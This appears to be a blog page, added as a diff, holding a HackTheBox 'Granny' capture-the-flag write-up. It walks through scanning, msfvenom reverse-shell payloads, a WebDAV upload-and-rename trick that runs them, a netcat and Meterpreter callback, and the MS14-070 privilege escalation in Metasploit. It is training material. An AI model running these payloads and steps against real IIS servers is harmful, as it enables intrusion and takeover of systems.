@@ -1,0 +1,340 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Granny | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Granny from HackTheBox."> <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo1.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/20_grandma/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Biscotti</span> Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/bounties/">bounties </a> </li> <li class="nav-item "> <a class="nav-link" href="/cves/">cves </a> </li> <li class="nav-item "> <a class="nav-link" href="/presentations/">talks </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/publications/">publications </a> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Granny</h1> <p class="post-description">Granny from HackTheBox.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/granny/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Granny Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/Granny" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> Spending time with Granny this time. But we are going to use a different exploit from Grandpa. Privilege escalation is the same though.</p> <p>Always start off with a nmap scan to determine the ports open.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap 10.10.10.15   
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-01-30 00:38 AEDT
+Nmap scan report <span class="k">for </span>10.10.10.15
+Host is up <span class="o">(</span>0.020s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 999 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-server-header: Microsoft-IIS/6.0
+| http-webdav-scan: 
+|   Server Date: Wed, 29 Jan 2025 13:38:25 GMT
+|   Server Type: Microsoft-IIS/6.0
+|   WebDAV <span class="nb">type</span>: Unknown
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+|_http-title: Under Construction
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2003|2008|XP <span class="o">(</span>89%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3
+Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 <span class="o">(</span>89%<span class="o">)</span>, Microsoft Windows Server 2003 SP2 <span class="o">(</span>88%<span class="o">)</span>, Microsoft Windows Server 2008 Enterprise SP2 <span class="o">(</span>87%<span class="o">)</span>, Microsoft Windows XP SP3 <span class="o">(</span>87%<span class="o">)</span>, Microsoft Windows 2003 SP2 <span class="o">(</span>86%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   20.71 ms 10.10.16.1
+2   20.73 ms 10.10.10.15
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.43 seconds
+</code></pre></div></div> <p><br> Create an asp payload with msfvenom.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.12 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">ExitFunc</span><span class="o">=</span>thread <span class="nt">-f</span> asp <span class="nt">-o</span> shell.asp
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of asp file: 38252 bytes
+Saved as: shell.asp
+</code></pre></div></div> <p><br> Try uploading the file to the webserver since the nmap said that it allowed for PUT requests.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>curl http://10.10.10.15/images <span class="nt">--upload-file</span> shell.asp
+&lt;<span class="o">!</span>DOCTYPE HTML PUBLIC <span class="s2">"-//W3C//DTD HTML 4.01//EN"</span> <span class="s2">"http://www.w3.org/TR/html4/strict.dtd"</span><span class="o">&gt;</span>
+&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;The page cannot be displayed&lt;/TITLE&gt;
+&lt;META HTTP-EQUIV<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">Content</span><span class="o">=</span><span class="s2">"text/html; charset=Windows-1252"</span><span class="o">&gt;</span>
+&lt;STYLE <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>
+  BODY <span class="o">{</span> font: 8pt/12pt verdana <span class="o">}</span>
+  H1 <span class="o">{</span> font: 13pt/15pt verdana <span class="o">}</span>
+  H2 <span class="o">{</span> font: 8pt/12pt verdana <span class="o">}</span>
+  A:link <span class="o">{</span> color: red <span class="o">}</span>
+  A:visited <span class="o">{</span> color: maroon <span class="o">}</span>
+&lt;/STYLE&gt;
+&lt;/HEAD&gt;&lt;BODY&gt;&lt;TABLE <span class="nv">width</span><span class="o">=</span>500 <span class="nv">border</span><span class="o">=</span>0 <span class="nv">cellspacing</span><span class="o">=</span>10&gt;&lt;TR&gt;&lt;TD&gt;
+
+&lt;h1&gt;The page cannot be displayed&lt;/h1&gt;
+The page you are looking <span class="k">for </span>cannot be displayed because an invalid method <span class="o">(</span>HTTP verb<span class="o">)</span> was used to attempt access.
+&lt;hr&gt;
+&lt;p&gt;Please try the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Contact the Web site administrator <span class="k">if </span>you believe that this request should be allowed.&lt;/li&gt;
+&lt;li&gt;Make sure that the Web site address displayed <span class="k">in </span>the address bar of your browser is spelled and formatted correctly. &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;HTTP Error 405 - The HTTP verb used to access this page is not allowed.&lt;br&gt;Internet Information Services <span class="o">(</span>IIS<span class="o">)</span>&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Technical Information <span class="o">(</span><span class="k">for </span>support personnel<span class="o">)</span>&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Go to &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"http://go.microsoft.com/fwlink/?linkid=8180"</span><span class="o">&gt;</span>Microsoft Product Support Services&lt;/a&gt; and perform a title search <span class="k">for </span>the words &lt;b&gt;HTTP&lt;/b&gt; and &lt;b&gt;405&lt;/b&gt;.&lt;/li&gt;
+&lt;li&gt;Open &lt;b&gt;IIS Help&lt;/b&gt;, which is accessible <span class="k">in </span>IIS Manager <span class="o">(</span>inetmgr<span class="o">)</span>,
+ and search <span class="k">for </span>topics titled &lt;b&gt;Setting Application Mappings&lt;/b&gt;, &lt;b&gt;Securing Your Site with Web Site Permissions&lt;/b&gt;, and &lt;b&gt;About Custom Error Messages&lt;/b&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+</code></pre></div></div> <p><br> Perhaps, there is an extension check preventing the upload. Let’s test this. Change the extension to txt.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span><span class="nb">cp </span>shell.asp shell.txt
+</code></pre></div></div> <p><br> Start a netcat listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                              
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div> <p><br> Try using cadever to upload the file to the webserver. Then use the MOVE command to change the extension back to .asp. Finally, use curl to execute the payload.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>cadaver http://10.10.10.15                     
+dav:/&gt; put shell.txt
+Uploading shell.txt to <span class="sb">`</span>/shell.txt<span class="s1">':
+Progress: [=============================&gt;] 100.0% of 38252 bytes succeeded.
+dav:/&gt; move shell.txt shell.asp
+Moving `/shell.txt'</span> to <span class="sb">`</span>/shell.asp<span class="s1">': failed:
+Could not parse response: XML parse error at line 1: Extra content at the end of the document
+
+┌──(kali㉿kali)-[~/Documents/htb/granny]
+└─$ curl http://10.10.10.15/shell.asp
+</span></code></pre></div></div> <p><br> Check the listener and catch the shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443                              
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.16.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.15] 1030
+Microsoft Windows <span class="o">[</span>Version 5.2.3790]
+<span class="o">(</span>C<span class="o">)</span> Copyright 1985-2003 Microsoft Corp.
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
+</code></pre></div></div> <p><br> Now…it was at this point that I was struggling with the compiled privelege escalation exploit. It kept freezing my shell. So, I decided to pivot to Meterpreter. But I cut the struggle out for cleanliness.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/erwinwildenburg/Offsec/blob/master/Exploits/Windows/Privilege%20Escalation/MS14-070.c
+</code></pre></div></div> <p><br> Use msfvenom to generate a new payload in asp format and with the txt extension.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span> msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.12 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> asp <span class="nt">-o</span> special.txt       
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of asp file: 38316 bytes
+Saved as: special.txt
+</code></pre></div></div> <p><br> Start the a multi handler in msfconsole.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>msfconsole <span class="nt">-q</span>
+msf6 <span class="o">&gt;</span> use exploit/multi/handler
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Payload options <span class="o">(</span>generic/shell_reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST                   <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.16.12
+LHOST <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 10.10.16.12
+LHOST <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lport 443
+lport <span class="o">=&gt;</span> 443
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Use cadaver to PUT the file and MOVE the file exactly like we did before.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>cadaver http://10.10.10.15       
+dav:/&gt; put special.txt
+Uploading special.txt to <span class="sb">`</span>/special.txt<span class="s1">':
+Progress: [=============================&gt;] 100.0% of 38316 bytes succeeded.
+dav:/&gt; move special.txt special.asp
+Moving `/special.txt'</span> to <span class="sb">`</span>/special.asp<span class="s1">': failed:
+Could not parse response: XML parse error at line 1: Extra content at the end of the document
+
+dav:/&gt;
+</span></code></pre></div></div> <p><br> Curl the uploaded file.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/granny]
+└─<span class="nv">$ </span>curl http://10.10.10.15/special.asp  
+</code></pre></div></div> <p><br> Check the multi/handler and catch the meterpreter session.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.12:443 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>177734 bytes<span class="o">)</span> to 10.10.10.15
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.16.12:443 -&gt; 10.10.10.15:1041<span class="o">)</span> at 2025-01-30 02:04:26 +1100
+
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div> <p><br> Run ps to get a list of the processes and migrate to a process that is owned by Networ Service user.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> ps
+
+Process List
+<span class="o">============</span>
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ <span class="nt">---</span>   <span class="nt">----</span>  <span class="nt">----</span>               <span class="nt">----</span>  <span class="nt">-------</span>  <span class="nt">----</span>                          <span class="nt">----</span>
+ 0     0     <span class="o">[</span>System Process]
+ 4     0     System
+ 272   4     smss.exe
+ 320   272   csrss.exe
+ 324   1064  cidaemon.exe
+ 344   272   winlogon.exe
+ 392   344   services.exe
+ 404   344   lsass.exe
+ 584   392   svchost.exe
+ 672   392   svchost.exe
+ 732   392   svchost.exe
+ 748   1064  cidaemon.exe
+ 752   392   svchost.exe
+ 788   392   svchost.exe
+ 900   1064  cidaemon.exe
+ 924   392   spoolsv.exe
+ 952   392   msdtc.exe
+ 1064  392   cisvc.exe
+ 1112  392   svchost.exe
+ 1168  392   inetinfo.exe
+ 1204  392   svchost.exe
+ 1308  392   VGAuthService.exe
+ 1380  392   vmtoolsd.exe
+ 1388  1764  cmd.exe            x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe
+ 1480  392   svchost.exe
+ 1588  392   svchost.exe
+ 1712  1388  MS14-070.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
+ 1764  2040  svchost.exe        x86   0                                      C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\r</span>adF7B0F.tmp<span class="se">\s</span>vchost.exe
+ 1768  392   dllhost.exe
+ 1936  392   alg.exe
+ 1956  2976  MS14-070.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE
+ 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\w</span>miprvse.exe
+ 2040  1480  w3wp.exe           x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv<span class="se">\w</span>3wp.exe
+ 2108  1956  cmd.exe            x86   0                                      c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe
+ 2112  584   davcdata.exe       x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv<span class="se">\d</span>avcdata.exe
+ 2252  1712  cmd.exe            x86   0                                      c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe
+ 2376  2040  svchost.exe        x86   0                                      C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\r</span>adEE1F2.tmp<span class="se">\s</span>vchost.exe
+ 2404  584   wmiprvse.exe
+ 2964  2040  svchost.exe        x86   0                                      C:<span class="se">\W</span>INDOWS<span class="se">\T</span>emp<span class="se">\r</span>ad09BBC.tmp<span class="se">\s</span>vchost.exe
+ 2976  2964  cmd.exe            x86   0        NT AUTHORITY<span class="se">\N</span>ETWORK SERVICE  C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32<span class="se">\c</span>md.exe
+
+meterpreter <span class="o">&gt;</span> migrate 2112
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migrating from 2376 to 2112...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Migration completed successfully.
+</code></pre></div></div> <p><br> Background the session and search for the local_exploit_suggester. Set the session with the session number from before. Run the exploit.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> 
+Background session 1? <span class="o">[</span>y/N]  y
+<span class="o">[</span>-] Unknown <span class="nb">command</span>: y. Run the <span class="nb">help command </span><span class="k">for </span>more details.
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> search suggester
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+   -  <span class="nt">----</span>                                      <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  post/multi/recon/local_exploit_suggester  <span class="nb">.</span>                normal  No     Multi Recon Local Exploit Suggester
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+
+msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> use post/multi/recon/local_exploit_suggester
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>post/multi/recon/local_exploit_suggester<span class="o">)</span>:
+
+   Name             Current Setting  Required  Description
+   <span class="nt">----</span>             <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   SESSION                           <span class="nb">yes       </span>The session to run this module on
+   SHOWDESCRIPTION  <span class="nb">false            yes       </span>Displays a detailed description <span class="k">for </span>the available exploits
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+session <span class="o">=&gt;</span> 1
+msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.15 - Collecting <span class="nb">local </span>exploits <span class="k">for </span>x86/windows...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.15 - 203 exploit checks are being tried...
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+<span class="o">[</span>+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running check method <span class="k">for </span>exploit 42 / 42
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.15 - Valid modules <span class="k">for </span>session 1:
+<span class="o">============================</span>
+
+ <span class="c">#   Name                                                           Potentially Vulnerable?  Check Result</span>
+ -   <span class="nt">----</span>                                                           <span class="nt">-----------------------</span>  <span class="nt">------------</span>
+ 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
+ 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
+ 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
+</code></pre></div></div> <p><br> Choose the ms14_070_tcpip_ioctl exploit. Set the session to the meterpreter session that we backgrounded. Set the LHOST option to the IP address of the tun0 interface.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 post<span class="o">(</span>multi/recon/local_exploit_suggester<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/local/ms14_070_tcpip_ioctl
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit<span class="o">(</span>windows/local/ms14_070_tcpip_ioctl<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>exploit/windows/local/ms14_070_tcpip_ioctl<span class="o">)</span>:
+
+   Name     Current Setting  Required  Description
+   <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   SESSION                   <span class="nb">yes       </span>The session to run this module on
+
+
+Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name      Current Setting  Required  Description
+   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   EXITFUNC  thread           <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
+   LHOST     10.0.2.15        <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT     4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   Windows Server 2003 SP2
+
+
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 exploit<span class="o">(</span>windows/local/ms14_070_tcpip_ioctl<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
+session <span class="o">=&gt;</span> 1
+msf6 exploit<span class="o">(</span>windows/local/ms14_070_tcpip_ioctl<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>windows/local/ms14_070_tcpip_ioctl<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost tun0
+lhost <span class="o">=&gt;</span> 10.10.16.12
+msf6 exploit<span class="o">(</span>windows/local/ms14_070_tcpip_ioctl<span class="o">)</span> <span class="o">&gt;</span> exploit
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.16.12:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Storing the shellcode <span class="k">in </span>memory...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Triggering the vulnerability...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Checking privileges after exploitation...
+<span class="o">[</span>+] Exploitation successful!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>177734 bytes<span class="o">)</span> to 10.10.10.15
